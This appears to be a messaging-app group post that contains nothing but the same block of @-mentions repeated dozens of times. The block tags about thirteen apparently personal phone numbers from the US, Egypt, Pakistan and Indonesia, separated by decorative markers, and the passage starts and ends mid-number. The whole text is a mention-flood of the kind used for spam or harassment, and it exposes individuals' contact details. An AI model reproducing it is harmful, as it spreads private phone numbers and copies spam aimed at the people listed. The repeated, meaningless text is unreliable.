896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 812-1515-7321⁩@⁨+62 882-1301-1492⁩@⁨+62 882-3176-8155⁩@⁨+62 896-5264-1580⁩~* *~@⁨+1 (567) 248-4624⁩@⁨+1 (650) 356-8546⁩@⁨+1 (920) 264-9108⁩@⁨+20 106 010 6399⁩@⁨+20 106 701 8537⁩@⁨+20 109 931 6260⁩~* *~@⁨+20 120 826 3304⁩@⁨+92 312 8304635⁩@⁨+62 